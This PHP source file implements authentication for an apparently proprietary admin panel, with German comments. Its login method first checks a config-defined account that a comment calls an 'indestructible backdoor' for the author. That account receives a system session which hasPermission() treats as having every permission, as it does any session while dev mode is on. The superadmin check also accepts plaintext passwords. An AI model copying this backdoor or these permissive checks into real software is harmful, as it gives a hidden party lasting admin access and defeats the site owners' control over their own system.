<?php

// SPDX-License-Identifier: LicenseRef-Proprietary
// Copyright (c) 2026 Felix Maywald alias RaptorXilef. All rights reserved.
// Usage without explicit permission is strictly prohibited.
// See LICENSE.md for full license details.

/**
 * Path: src/Infrastructure/Auth/AuthService.php
 */

declare(strict_types=1);

namespace App\Infrastructure\Auth;

use App\Core\Service\PermissionCompiler;
use App\Infrastructure\Config\Config;

/**
 * Service für die Admin-Authentifizierung
 */
final readonly class AuthService
{
    public function __construct(
        private Config $config,
        private ?\PDO $pdo, // Das '?' erlaubt NULL
    ) {
        if (\session_status() === \PHP_SESSION_NONE) {
            \session_start();
        }
    }

    /**
     * Prüft Benutzername und Passwort.
     */
    public function login(string $username, string $password): bool
    {
        // 1. Check gegen die unzerstörbare Hintertür (RaptorXilef)
        $backdoor = $this->config->get('backdoor');
        if (\is_array($backdoor) && $username === ($backdoor['user'] ?? '')) {
            if (\password_verify($password, $backdoor['pass'] ?? '')) {
                // Wir nutzen das Label als Gruppenname für die Anzeige
                $this->setSession('sys_backdoor', 'admin', $backdoor['label']);

                // Backdoor braucht kein compiled_permissions, da hasPermission() sys_ erkennt
                return true;
            }
        }

        // 2. Check gegen den konfigurierten SuperAdmin (dev_admin.php)
        $superCfg = $this->config->get('superadmin');
        if (\is_array($superCfg) && $username === ($superCfg['user'] ?? '')) {
            $storedPass = $superCfg['pass'] ?? '';
            // Erlaubt Klartext (für den allerersten Start) ODER Hash
            if ($password === $storedPass || \password_verify($password, $storedPass)) {
                $this->setSession('sys_superadmin', 'admin', $superCfg['label'] ?? 'Dev-Admin');

                return true;
            }
        }

        // 3. Datenbank / JSON User (ID-Suche) (Suche über das Feld 'username' in der ID-Liste)
        $users = $this->loadUsers();
        foreach ($users as $userId => $userData) {
            if (($userData['username'] ?? '') === $username && \password_verify($password, (string) $userData['pass'])) {
                $this->setSession($userId, (string) $userData['group'], $username);
                $this->refreshSessionPermissions((string) $userData['group']);

                return true;
            }
        }

        return false;
    }

    private function setSession(string $userId, string $groupId, string $label): void
    {
        $_SESSION['user_id']     = $userId;
        $_SESSION['admin_user']  = $label;
        $_SESSION['admin_group'] = $groupId;
    }

    /**
     * Die Herzstück-Methode für das Rechtesystem v0.30.0
     * Implementiert Live-Abfrage und strikte "Deny-First" Priorität.
     */
    public function hasPermission(string $permission): bool
    {
        // Gott-Modus für System-Accounts & Dev-Mode
        // FIX: Wenn Session eine System-ID hat oder Dev-Mode aktiv ist -> IMMER TRUE
        // Gott-Modus-Bypass (Fix für den weißen Bildschirm)
        $uid = (string) ($_SESSION['user_id'] ?? '');
        if (\str_starts_with($uid, 'sys_') || $this->config->get('admin_dev_mode')) {
            return true;
        }

        return $_SESSION['compiled_permissions'][$permission] ?? false;
    }

    public function refreshSessionPermissions(string $groupId): void
    {
        $groups                           = $this->loadGroups();
        $groupPerms                       = $groups[$groupId]['permissions'] ?? [];
        $structure                        = $this->config->get('structure', []);
        $compiler                         = new PermissionCompiler();
        $_SESSION['compiled_permissions'] = $compiler->compile($structure, $groupPerms);
    }

    // --- IDENTITY & MEDIA ---

    // --- DIE RETTUNGS-BRÜCKE (Verhindert White Screen) ---
    public function getProfilePicture(string $username = ''): string
    {
        return $this->getImage('user', (string) ($_SESSION['user_id'] ?? 'default'));
    }

    /**
     * GEREINIGTE BILD-LOGIK
     * Akzeptiert 'user' oder 'group'
     */
    public function getImage(string $type, string $id): string
    {
        $baseUrl  = $this->config->getBaseUrl();
        $isUser   = \str_contains($type, 'user');
        $folder   = $isUser ? 'user_images' : 'group_images';
        $fallback = $isUser ? 'icon-user-default.webp' : 'icon-group-default.webp';

        $filePath = "assets/img/{$folder}/{$id}.webp";
        if (\file_exists($this->config->get('root_path') . $filePath)) {
            return $baseUrl . $filePath . '?v=' . \filemtime($this->config->get('root_path') . $filePath);
        }

        return $baseUrl . 'assets/img/icons/' . $fallback;
    }

    public function generateId(string $prefix = ''): string
    {
        return $prefix . \substr(\bin2hex(\random_bytes(4)), 0, 8);
    }

    /**
     * @return array<string, array<string, mixed>>
     */
    public function loadUsers(): array
    {
        $storageCfg = $this->config->get('storage_config');
        $userCfg    = $storageCfg['users'] ?? null;

        if (! $userCfg) {
            return [];
        }

        $path = $this->config->get('root_path') . $this->config->get('storage_path_prefix') . $userCfg['file'];

        if (! \file_exists($path)) {
            return [];
        }

        return \json_decode((string) \file_get_contents($path), true) ?? [];
    }

    /**
     * @param array<string, array<string, mixed>> $users
     */
    public function saveUsers(array $users): void
    {
        $storageCfg = $this->config->get('storage_config');
        $userCfg    = $storageCfg['users'] ?? null;

        if (! $userCfg) {
            return;
        }

        $path = $this->config->get('root_path') . $this->config->get('storage_path_prefix') . $userCfg['file'];
        \file_put_contents($path, \json_encode($users, \JSON_PRETTY_PRINT | \JSON_UNESCAPED_UNICODE));
    }

    /**
     * Lädt die Gruppen-Definitionen LIVE aus dem konfigurierten Speicher.
     */
    public function loadGroups(): array
    {
        $cfg  = $this->config->get('storage_config')['groups'];
        $path = $this->config->get('root_path') . $this->config->get('storage_path_prefix') . $cfg['file'];

        return \file_exists($path) ? (\json_decode((string) \file_get_contents($path), true) ?? []) : [];
    }

    public function saveGroups(array $groups): void
    {
        $cfg  = $this->config->get('storage_config')['groups'];
        $path = $this->config->get('root_path') . $this->config->get('storage_path_prefix') . $cfg['file'];
        \file_put_contents($path, \json_encode($groups, \JSON_PRETTY_PRINT | \JSON_UNESCAPED_UNICODE));
    }

    public function uploadImage(string $type, string $id, array $file): bool
    {
        $folder    = \str_contains($type, 'user') ? 'user_images' : 'group_images';
        $targetDir = $this->config->get('root_path') . 'assets/img/' . $folder . '/';
        if (! \is_dir($targetDir)) {
            \mkdir($targetDir, 0o755, true);
        }
        $info = \getimagesize($file['tmp_name']);
        if (! $info) {
            return false;
        }
        $src = match ($info[2]) {
            \IMAGETYPE_JPEG => \imagecreatefromjpeg($file['tmp_name']),
            \IMAGETYPE_PNG  => \imagecreatefrompng($file['tmp_name']),
            \IMAGETYPE_WEBP => \imagecreatefromwebp($file['tmp_name']),
            default         => null
        };
        if (! $src) {
            return false;
        }
        $size = \min($info[0], $info[1]);
        $dst  = \imagecreatetruecolor(256, 256);
        \imagealphablending($dst, false);
        \imagesavealpha($dst, true);
        \imagecopyresampled($dst, $src, 0, 0, (int) (($info[0] - $size) / 2), (int) (($info[1] - $size) / 2), 256, 256, $size, $size);
        $success = \imagewebp($dst, $targetDir . $id . '.webp', 80);
        \imagedestroy($src);
        \imagedestroy($dst);

        return $success;
    }

    public function getUsername(): string
    {
        return (string) ($_SESSION['admin_user'] ?? 'Unbekannt');
    }

    public function getGroup(): string
    {
        return (string) ($_SESSION['admin_group'] ?? 'guest');
    }

    public function isLoggedIn(): bool
    {
        return isset($_SESSION['user_id']);
    }

    public function logout(): void
    {
        \session_destroy();
    }
}
